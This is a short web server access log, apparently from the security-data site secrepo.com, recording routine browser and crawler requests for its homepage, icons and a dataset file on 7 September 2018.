101.164.197.106 - - [07/Sep/2018:21:29:28 -0700] "GET / HTTP/1.1" 200 12346 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36" 
116.87.189.76 - - [07/Sep/2018:21:31:28 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Linux; U; Android 5.0.2; en-gb; Redmi Note 2 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.8.4" 
116.87.189.76 - - [07/Sep/2018:21:31:28 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 5.0.2; en-gb; Redmi Note 2 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.8.4" 
116.87.189.76 - - [07/Sep/2018:21:31:28 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 5.0.2; en-gb; Redmi Note 2 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.8.4" 
116.87.189.76 - - [07/Sep/2018:21:31:29 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; U; Android 5.0.2; en-gb; Redmi Note 2 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.8.4" 
108.59.8.80 - - [07/Sep/2018:21:34:11 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
41.223.160.173 - - [07/Sep/2018:21:34:38 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
111.93.173.86 - - [07/Sep/2018:21:41:53 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" 
111.93.173.86 - - [07/Sep/2018:21:41:53 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" 
111.93.173.86 - - [07/Sep/2018:21:41:53 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" 
111.93.173.86 - - [07/Sep/2018:21:41:54 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" 
18.219.142.57 - - [07/Sep/2018:21:43:38 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Linux x86_64) Trident/5.0 Chrome/67.0.3396.79 Safari/537.36" 
106.39.0.73 - - [07/Sep/2018:21:55:02 -0700] "GET / HTTP/1.1" 301 483 "http://www.freebuf.com/articles/network/131279.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
106.39.0.73 - - [07/Sep/2018:21:55:03 -0700] "GET / HTTP/1.1" 200 12383 "http://www.freebuf.com/articles/network/131279.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
106.39.0.73 - - [07/Sep/2018:21:55:04 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
106.39.0.73 - - [07/Sep/2018:21:55:04 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
